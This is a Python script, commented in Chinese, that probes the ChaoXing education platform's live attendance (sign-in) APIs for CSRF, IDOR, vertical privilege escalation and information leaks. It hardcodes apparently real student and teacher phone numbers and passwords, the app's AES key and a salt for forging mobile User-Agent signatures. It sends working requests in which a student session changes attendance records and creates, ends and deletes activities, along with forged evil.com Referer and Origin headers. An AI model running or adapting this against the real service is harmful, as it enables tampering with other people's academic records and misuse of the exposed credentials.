#!/usr/bin/env python3
"""
ChaoXing 平台移动端 vs PC端 认证差异测试 & 权限控制综合评估
测试CSRF漏洞、IDOR、垂直越权、信息泄露等安全问题
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
ACTIVE_ID = "5000163891319"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"

PC_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"

# ============ 工具函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def make_session_with_ua(base_session, ua_str):
    """基于已登录session创建新session，替换UA"""
    ns = requests.Session()
    ns.verify = False
    ns.headers.update({"User-Agent": ua_str, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    for c in base_session.cookies:
        ns.cookies.set(c.name, c.value)
    return ns

def safe_get(session, url, desc, timeout=20, **kwargs):
    try:
        r = session.get(url, timeout=timeout, allow_redirects=False, **kwargs)
        body = r.text[:2000]
        return {"status": r.status_code, "body": body, "headers": dict(r.headers), "ok": True}
    except Exception as e:
        return {"status": 0, "body": str(e), "headers": {}, "ok": False}

def safe_post(session, url, desc, data=None, timeout=20, **kwargs):
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=False, **kwargs)
        body = r.text[:2000]
        return {"status": r.status_code, "body": body, "headers": dict(r.headers), "ok": True}
    except Exception as e:
        return {"status": 0, "body": str(e), "headers": {}, "ok": False}

def print_result(label, result, marker=""):
    prefix = f"  {marker} " if marker else "  "
    print(f"{prefix}[{label}]")
    print(f"{prefix}  状态码: {result['status']}")
    if result['ok']:
        # 尝试解析JSON
        try:
            j = json.loads(result['body'])
            print(f"{prefix}  响应(JSON): {json.dumps(j, ensure_ascii=False, indent=2)[:1500]}")
        except:
            print(f"{prefix}  响应: {result['body'][:1500]}")
    else:
        print(f"{prefix}  错误: {result['body'][:500]}")
    print()

# ============ 主测试流程 ============
def main():
    findings = []  # 收集所有重要发现

    print("=" * 80)
    print("  ChaoXing 平台 移动端 vs PC端 认证差异 & 权限控制综合评估")
    print("=" * 80)
    print()

    # ---- 登录 ----
    print("[*] 正在登录学生账号...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {stu_puid}")
    if not stu_puid:
        print("    !!! 学生登录失败，退出")
        sys.exit(1)

    print("[*] 正在登录教师账号...")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {tea_puid}")
    if not tea_puid:
        print("    !!! 教师登录失败，退出")
        sys.exit(1)

    # 创建不同UA的session
    stu_mobile = stu_session  # 默认就是mobile UA
    stu_pc = make_session_with_ua(stu_session, PC_UA)
    tea_mobile = tea_session
    tea_pc = make_session_with_ua(tea_session, PC_UA)

    print()
    print("=" * 80)
    print("  Part 1: 移动端 vs PC端 认证差异对比")
    print("=" * 80)
    print()

    mobile_url = f"{BASE}/pptSign/updateSignStatusByUidsV2"
    pc_url = f"{BASE}/widget/sign/pcTeaSignController/updateSignStatus2"

    mobile_params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }

    pc_params = {
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }

    tests_part1 = [
        ("1. Mobile UA + 学生Session → /pptSign/updateSignStatusByUidsV2", stu_mobile, mobile_url, mobile_params, "GET"),
        ("2. PC UA + 学生Session → /pptSign/updateSignStatusByUidsV2", stu_pc, mobile_url, mobile_params, "GET"),
        ("3. Mobile UA + 教师Session → /pptSign/updateSignStatusByUidsV2", tea_mobile, mobile_url, mobile_params, "GET"),
        ("4. PC UA + 教师Session → /pptSign/updateSignStatusByUidsV2", tea_pc, mobile_url, mobile_params, "GET"),
        ("5. PC UA + 学生Session → /widget/sign/pcTeaSignController/updateSignStatus2", stu_pc, pc_url, pc_params, "GET"),
        ("6. PC UA + 教师Session → /widget/sign/pcTeaSignController/updateSignStatus2", tea_pc, pc_url, pc_params, "GET"),
    ]

    for label, sess, url, params, method in tests_part1:
        print(f"[*] 测试: {label}")
        if method == "GET":
            r = safe_get(sess, url, label, params=params)
        else:
            r = safe_post(sess, url, label, data=params)
        print_result(label, r)
        # 检查是否学生成功修改
        if "学生" in label and r['ok']:
            try:
                j = json.loads(r['body'])
                if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
                    marker = "!!!"
                    findings.append(f"[Part1] 学生通过越权成功修改签到状态: {label} → {r['body'][:200]}")
                    print(f"  !!! 学生成功执行了教师操作！可能存在越权漏洞")
            except:
                pass

    print()
    print("=" * 80)
    print("  Part 2: IDOR测试 - 跨用户操作")
    print("=" * 80)
    print()

    # IDOR: 学生修改教师签到记录
    idor_url = f"{BASE}/pptSign/updateSignStatusByUidsV2"
    newsign_url = f"{BASE}/newsign/updateSignStatus"

    print("[*] 测试2.1: 学生Session修改教师(uids=teacher_puid)签到状态")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": TEACHER_PUID,
        "status": "1",
        "remark": ""
    }
    r = safe_get(stu_mobile, idor_url, "2.1", params=params)
    print_result("2.1 学生修改教师签到", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part2-2.1] IDOR: 学生可修改教师签到记录! → {r['body'][:200]}")
            print("  !!! IDOR漏洞: 学生可以修改教师的签到记录!")
    except:
        pass

    print("[*] 测试2.2: 学生Session修改多个用户签到状态(uids含多个ID)")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": f"{STUDENT_PUID},{TEACHER_PUID}",
        "status": "1",
        "remark": ""
    }
    r = safe_get(stu_mobile, idor_url, "2.2", params=params)
    print_result("2.2 学生修改多用户签到", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part2-2.2] IDOR: 学生可批量修改签到记录! → {r['body'][:200]}")
            print("  !!! IDOR漏洞: 学生可以批量修改签到记录!")
    except:
        pass

    print("[*] 测试2.3: 学生Session通过newsign修改教师签到")
    params = {
        "activeId": ACTIVE_ID,
        "uids": TEACHER_PUID,
        "status": "1",
    }
    r = safe_get(stu_mobile, newsign_url, "2.3", params=params)
    print_result("2.3 学生通过newsign修改教师签到", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part2-2.3] IDOR via newsign: 学生可修改教师签到记录! → {r['body'][:200]}")
            print("  !!! IDOR漏洞: 学生通过newsign可以修改教师签到记录!")
    except:
        pass

    print("[*] 测试2.4: 检查API是否验证请求用户权限")
    # 用教师session修改学生签到 - 作为对照
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }
    r_tea = safe_get(tea_mobile, idor_url, "2.4-teacher", params=params)
    print_result("2.4 教师修改学生签到(对照)", r_tea)

    # 对比学生session修改自己 vs 修改他人
    params_self = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }
    r_self = safe_get(stu_mobile, idor_url, "2.4-self", params=params_self)
    print_result("2.4 学生修改自己签到(对照)", r_self)

    print()
    print("=" * 80)
    print("  Part 3: 垂直越权测试 - 学生执行教师操作")
    print("=" * 80)
    print()

    # 3.1 创建签到活动
    print("[*] 测试3.1: 学生创建签到活动")
    create_url = f"{BASE}/ppt/activeAPI/createActive"
    create_data = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "type": "1",
        "name": "安全测试签到",
    }
    r = safe_post(stu_mobile, create_url, "3.1", data=create_data)
    print_result("3.1 学生创建签到活动", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part3-3.1] 垂直越权: 学生可创建签到活动! → {r['body'][:200]}")
            print("  !!! 垂直越权: 学生可以创建签到活动!")
    except:
        pass

    # 3.2 结束签到活动
    print("[*] 测试3.2: 学生结束签到活动")
    end_url = f"{BASE}/ppt/activeAPI/endSign"
    end_data = {
        "activeId": ACTIVE_ID,
    }
    r = safe_post(stu_mobile, end_url, "3.2", data=end_data)
    print_result("3.2 学生结束签到活动", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part3-3.2] 垂直越权: 学生可结束签到活动! → {r['body'][:200]}")
            print("  !!! 垂直越权: 学生可以结束签到活动!")
    except:
        pass

    # 3.3 删除活动
    print("[*] 测试3.3: 学生删除活动")
    delete_url = f"{BASE}/ppt/activeAPI/deleteActive"
    delete_data = {
        "activeId": ACTIVE_ID,
    }
    r = safe_post(stu_mobile, delete_url, "3.3", data=delete_data)
    print_result("3.3 学生删除活动", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part3-3.3] 垂直越权: 学生可删除活动! → {r['body'][:200]}")
            print("  !!! 垂直越权: 学生可以删除活动!")
    except:
        pass

    # 3.4 开始签到
    print("[*] 测试3.4: 学生发起签到")
    start_url = f"{BASE}/pptSign/startSign"
    start_data = {
        "activeId": ACTIVE_ID,
    }
    r = safe_post(stu_mobile, start_url, "3.4", data=start_data)
    print_result("3.4 学生发起签到", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part3-3.4] 垂直越权: 学生可发起签到! → {r['body'][:200]}")
            print("  !!! 垂直越权: 学生可以发起签到!")
    except:
        pass

    # 3.5 通过newsign创建活动
    print("[*] 测试3.5: 学生通过newsign创建活动")
    ns_create_url = f"{BASE}/newsign/createActive"
    ns_create_data = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "type": "1",
        "name": "安全测试签到_newsign",
    }
    r = safe_post(stu_mobile, ns_create_url, "3.5", data=ns_create_data)
    print_result("3.5 学生通过newsign创建活动", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part3-3.5] 垂直越权: 学生可通过newsign创建活动! → {r['body'][:200]}")
            print("  !!! 垂直越权: 学生可以通过newsign创建活动!")
    except:
        pass

    print()
    print("=" * 80)
    print("  Part 4: 批量操作测试")
    print("=" * 80)
    print()

    batch_url = f"{BASE}/pptSign/updateSignStatusByUidsV2"

    # 4.1 教师批量修改(逗号分隔)
    print("[*] 测试4.1: 教师Session批量修改(逗号分隔)")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": f"{STUDENT_PUID},{TEACHER_PUID}",
        "status": "1",
        "remark": ""
    }
    r = safe_get(tea_mobile, batch_url, "4.1", params=params)
    print_result("4.1 教师批量修改(逗号分隔)", r)

    # 4.2 学生批量修改(逗号分隔)
    print("[*] 测试4.2: 学生Session批量修改(逗号分隔)")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": f"{STUDENT_PUID},{TEACHER_PUID}",
        "status": "1",
        "remark": ""
    }
    r = safe_get(stu_mobile, batch_url, "4.2", params=params)
    print_result("4.2 学生批量修改(逗号分隔)", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part4-4.2] 学生可批量修改签到(逗号分隔)! → {r['body'][:200]}")
            print("  !!! 学生成功批量修改签到!")
    except:
        pass

    # 4.3 换行符分隔
    print("[*] 测试4.3: 学生Session批量修改(换行符分隔)")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": f"{STUDENT_PUID}\n{TEACHER_PUID}",
        "status": "1",
        "remark": ""
    }
    r = safe_get(stu_mobile, batch_url, "4.3", params=params)
    print_result("4.3 学生批量修改(换行符分隔)", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part4-4.3] 学生可批量修改签到(换行符分隔)! → {r['body'][:200]}")
            print("  !!! 学生成功批量修改签到(换行符)!")
    except:
        pass

    # 4.4 JSON数组格式
    print("[*] 测试4.4: 学生Session批量修改(JSON数组格式 - POST)")
    post_data = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": json.dumps([STUDENT_PUID, TEACHER_PUID]),
        "status": "1",
        "remark": ""
    }
    r = safe_post(stu_mobile, batch_url, "4.4", data=post_data)
    print_result("4.4 学生批量修改(JSON数组POST)", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part4-4.4] 学生可批量修改签到(JSON数组)! → {r['body'][:200]}")
            print("  !!! 学生成功批量修改签到(JSON数组)!")
    except:
        pass

    print()
    print("=" * 80)
    print("  Part 5: 信息泄露测试")
    print("=" * 80)
    print()

    # 5.1 学生查看签到结果
    print("[*] 测试5.1: 学生查看签到结果(signedResult)")
    url = f"{BASE}/pptSign/signedResult?activeId={ACTIVE_ID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={STUDENT_PUID}"
    r = safe_get(stu_mobile, url, "5.1")
    print_result("5.1 学生查看签到结果", r)
    # 检查是否包含其他学生信息
    if r['ok'] and len(r['body']) > 100:
        try:
            j = json.loads(r['body'])
            body_str = json.dumps(j, ensure_ascii=False)
            if TEACHER_PUID in body_str or "402644510" in body_str:
                findings.append(f"[Part5-5.1] 信息泄露: 学生可看到教师签到记录! → {body_str[:300]}")
                print("  *** 信息泄露: 学生可以看到教师的签到记录!")
            # 检查是否有多个用户数据
            if "data" in j and isinstance(j["data"], list) and len(j["data"]) > 1:
                findings.append(f"[Part5-5.1] 信息泄露: 学生可看到其他学生签到记录! 数据条数={len(j['data'])}")
                print(f"  *** 信息泄露: 学生可以看到其他学生的签到记录! 数据条数={len(j['data'])}")
        except:
            pass

    # 5.2 签到详情
    print("[*] 测试5.2: 学生查看签到详情(signDetail)")
    url = f"{BASE}/pptSign/signDetail?activeId={ACTIVE_ID}&uid={STUDENT_PUID}"
    r = safe_get(stu_mobile, url, "5.2")
    print_result("5.2 学生查看签到详情", r)
    if r['ok'] and len(r['body']) > 50:
        try:
            j = json.loads(r['body'])
            body_str = json.dumps(j, ensure_ascii=False)
            if TEACHER_PUID in body_str or "402644510" in body_str:
                findings.append(f"[Part5-5.2] 信息泄露: signDetail泄露教师信息! → {body_str[:300]}")
                print("  *** 信息泄露: signDetail泄露教师信息!")
        except:
            pass

    # 5.3 学生查询教师签到记录
    print("[*] 测试5.3: 学生查询教师签到记录(v2/apis/sign/signIn)")
    url = f"{BASE}/v2/apis/sign/signIn?activeId={ACTIVE_ID}&uid={TEACHER_PUID}"
    r = safe_get(stu_mobile, url, "5.3")
    print_result("5.3 学生查询教师签到记录", r)
    if r['ok'] and len(r['body']) > 50:
        try:
            j = json.loads(r['body'])
            if j.get("result") == 1 or j.get("data"):
                findings.append(f"[Part5-5.3] 信息泄露: 学生可查询教师签到记录! → {r['body'][:300]}")
                print("  *** 信息泄露: 学生可以查询教师的签到记录!")
        except:
            pass

    # 5.4 活动列表
    print("[*] 测试5.4: 学生查看活动列表(taskactivelist)")
    url = f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={STUDENT_PUID}"
    r = safe_get(stu_mobile, url, "5.4")
    print_result("5.4 学生查看活动列表", r)
    if r['ok'] and len(r['body']) > 100:
        try:
            j = json.loads(r['body'])
            body_str = json.dumps(j, ensure_ascii=False)
            if "activeId" in body_str or ACTIVE_ID in body_str:
                print("  *** 学生可以获取活动列表信息")
                findings.append(f"[Part5-5.4] 学生可获取活动列表! → {body_str[:300]}")
        except:
            pass

    # 5.5 PC端教师签到详情
    print("[*] 测试5.5: 学生访问PC端教师签到详情")
    url = f"{BASE}/widget/sign/pcTeaSignController/signDetail?activeId={ACTIVE_ID}"
    r = safe_get(stu_pc, url, "5.5")
    print_result("5.5 学生访问PC端教师签到详情", r)
    if r['ok'] and len(r['body']) > 100:
        try:
            j = json.loads(r['body'])
            body_str = json.dumps(j, ensure_ascii=False)
            if "data" in j or "result" in j:
                findings.append(f"[Part5-5.5] 学生可访问PC端教师签到详情! → {body_str[:300]}")
                print("  *** 学生可以访问PC端教师签到详情!")
        except:
            # 可能返回HTML
            if "签到" in r['body'] or "sign" in r['body'].lower():
                findings.append(f"[Part5-5.5] 学生可访问PC端教师签到页面(HTML)! → {r['body'][:300]}")
                print("  *** 学生可以访问PC端教师签到页面!")

    print()
    print("=" * 80)
    print("  Part 6: CSRF深度测试")
    print("=" * 80)
    print()

    csrf_url = f"{BASE}/pptSign/updateSignStatusByUidsV2"

    # 6.1 教师正常GET请求
    print("[*] 测试6.1: 教师正常GET请求(基准)")
    params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }
    r = safe_get(tea_mobile, csrf_url, "6.1", params=params)
    print_result("6.1 教师正常GET请求", r)

    # 6.2 无自定义Header请求
    print("[*] 测试6.2: 无自定义Header的GET请求(模拟CSRF)")
    csrf_session = requests.Session()
    csrf_session.verify = False
    # 只设置cookie，不设置任何自定义header
    for c in tea_session.cookies:
        csrf_session.cookies.set(c.name, c.value)
    csrf_session.headers.clear()
    csrf_session.headers["User-Agent"] = PC_UA
    r = safe_get(csrf_session, csrf_url, "6.2", params=params)
    print_result("6.2 无自定义Header请求", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part6-6.2] CSRF: 无自定义Header请求成功! → {r['body'][:200]}")
            print("  !!! CSRF漏洞确认: 无需自定义Header即可修改数据!")
    except:
        pass

    # 6.3 恶意Referer
    print("[*] 测试6.3: 恶意Referer(evil.com)")
    r = safe_get(tea_mobile, csrf_url, "6.3", params=params,
                 headers={"Referer": "https://evil.com/"})
    print_result("6.3 恶意Referer", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part6-6.3] CSRF: 恶意Referer请求成功! → {r['body'][:200]}")
            print("  !!! CSRF漏洞确认: 恶意Referer不被拒绝!")
    except:
        pass

    # 6.4 恶意Origin
    print("[*] 测试6.4: 恶意Origin(evil.com)")
    r = safe_get(tea_mobile, csrf_url, "6.4", params=params,
                 headers={"Origin": "https://evil.com"})
    print_result("6.4 恶意Origin", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part6-6.4] CSRF: 恶意Origin请求成功! → {r['body'][:200]}")
            print("  !!! CSRF漏洞确认: 恶意Origin不被拒绝!")
    except:
        pass

    # 6.5 验证GET请求是否实际修改数据 - 先查后改再查
    print("[*] 测试6.5: 验证GET请求是否实际修改数据(先查→改→查)")

    # 先查询当前状态
    check_url = f"{BASE}/pptSign/signedResult?activeId={ACTIVE_ID}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={STUDENT_PUID}"
    r_before = safe_get(tea_mobile, check_url, "6.5-before")
    print_result("6.5a 修改前查询", r_before)

    # 执行修改(status=0 设为未签到)
    modify_params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "0",
        "remark": ""
    }
    r_modify = safe_get(tea_mobile, csrf_url, "6.5-modify", params=modify_params)
    print_result("6.5b 执行修改(status=0)", r_modify)

    # 再查询
    r_after = safe_get(tea_mobile, check_url, "6.5-after")
    print_result("6.5c 修改后查询", r_after)

    # 对比
    if r_before['ok'] and r_after['ok'] and r_before['body'] != r_after['body']:
        findings.append(f"[Part6-6.5] CSRF数据修改确认: GET请求确实修改了数据!")
        print("  !!! CSRF数据修改确认: GET请求确实修改了数据!")
    elif r_before['ok'] and r_after['ok'] and r_before['body'] == r_after['body']:
        print("  [i] 修改前后数据一致，GET请求可能未实际修改数据(或查询接口不反映变更)")

    # 恢复状态
    restore_params = {
        "DB_STRATEGY": "PRIMARY_KEY",
        "STRATEGY_PARA": "activeId",
        "activeId": ACTIVE_ID,
        "uids": STUDENT_PUID,
        "status": "1",
        "remark": ""
    }
    safe_get(tea_mobile, csrf_url, "6.5-restore", params=restore_params)
    print("  [i] 已尝试恢复签到状态")

    # 6.6 POST方式测试CSRF
    print("[*] 测试6.6: POST方式提交(updateSignStatusByUidsV2)")
    r = safe_post(tea_mobile, csrf_url, "6.6", data=params)
    print_result("6.6 POST方式提交", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part6-6.6] CSRF: POST方式也可修改数据! → {r['body'][:200]}")
            print("  !!! POST方式也可修改数据!")
    except:
        pass

    # 6.7 无Cookie请求(完全无认证)
    print("[*] 测试6.7: 无Cookie请求(完全无认证)")
    no_auth_session = requests.Session()
    no_auth_session.verify = False
    no_auth_session.headers["User-Agent"] = PC_UA
    r = safe_get(no_auth_session, csrf_url, "6.7", params=params)
    print_result("6.7 无Cookie请求", r)
    try:
        j = json.loads(r['body'])
        if j.get("result") == 1 or j.get("result") == True or "success" in str(j).lower():
            findings.append(f"[Part6-6.7] 严重: 无认证即可修改数据! → {r['body'][:200]}")
            print("  !!! 严重漏洞: 无需任何认证即可修改数据!")
    except:
        pass

    # ============ 综合总结 ============
    print()
    print("=" * 80)
    print("  综合评估总结")
    print("=" * 80)
    print()

    if findings:
        print(f"  共发现 {len(findings)} 个安全问题:")
        print()
        for i, f in enumerate(findings, 1):
            print(f"  [{i}] {f}")
            print()
    else:
        print("  未发现明显安全问题")

    print()
    print("  --- 分类总结 ---")
    print()

    csrf_findings = [f for f in findings if "CSRF" in f]
    idor_findings = [f for f in findings if "IDOR" in f]
    priv_findings = [f for f in findings if "越权" in f]
    info_findings = [f for f in findings if "信息泄露" in f or "泄露" in f]

    print(f"  CSRF漏洞: {len(csrf_findings)} 个")
    for f in csrf_findings:
        print(f"    - {f}")
    print()

    print(f"  IDOR漏洞: {len(idor_findings)} 个")
    for f in idor_findings:
        print(f"    - {f}")
    print()

    print(f"  垂直越权: {len(priv_findings)} 个")
    for f in priv_findings:
        print(f"    - {f}")
    print()

    print(f"  信息泄露: {len(info_findings)} 个")
    for f in info_findings:
        print(f"    - {f}")
    print()

    print("=" * 80)
    print("  测试完成")
    print("=" * 80)


if __name__ == "__main__":
    main()
